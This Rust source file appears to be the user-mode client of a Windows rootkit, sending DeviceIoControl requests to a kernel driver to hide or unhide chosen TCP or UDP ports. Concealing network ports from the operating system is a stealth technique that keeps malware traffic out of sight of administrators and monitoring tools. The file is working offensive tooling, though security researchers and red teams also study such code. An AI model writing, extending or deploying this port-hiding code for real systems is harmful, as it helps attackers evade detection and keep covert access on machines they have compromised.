use crate::utils::{open_driver, PortType, Protocol};
use common::structs::TargetPort;
use std::{ffi::c_void, ptr::null_mut};
use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError, HANDLE},
    System::IO::DeviceIoControl,
};

/// Provides operations for managing network ports through a driver interface.
pub struct Network {
    driver_handle: HANDLE,
}

impl Network {
    /// Creates a new `Port` instance, opening a handle to the driver.
    ///
    /// # Returns
    ///
    /// * An instance of `Port`.
    ///
    /// # Panics
    ///
    /// Panics if the driver cannot be opened.
    pub fn new() -> Self {
        let driver_handle = open_driver().expect("Error");
        Self { driver_handle }
    }

    /// Hides or unhides a specific network port.
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for the hide/unhide operation.
    /// * `protocol` - The protocol type (e.g., TCP, UDP) for the port.
    /// * `port_type` - The type of port (e.g., LOCAL, REMOTE).
    /// * `port_number` - The number of the port to hide or unhide.
    /// * `enable` - `true` to hide the port or `false` to unhide it.
    pub fn hide_unhide_port(
        self,
        ioctl_code: u32,
        protocol: Protocol,
        port_type: PortType,
        port_number: u16,
        enable: bool,
    ) {
        let mut port_info = TargetPort {
            protocol: protocol.to_shared(),
            port_type: port_type.to_shared(),
            port_number,
            enable,
        };

        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut port_info as *mut _ as *mut c_void,
                size_of::<TargetPort>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            log::error!("DeviceIoControl failed with status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            log::info!("Port with number {} successfully {}hidden", port_number, if enable { "" } else { "un" });
        }
    }
}

impl Drop for Network {
    /// Ensures the driver handle is closed when `Port` goes out of scope.
    fn drop(&mut self) {
        log::debug!("Closing the driver handle");
        unsafe { CloseHandle(self.driver_handle) };
    }
}
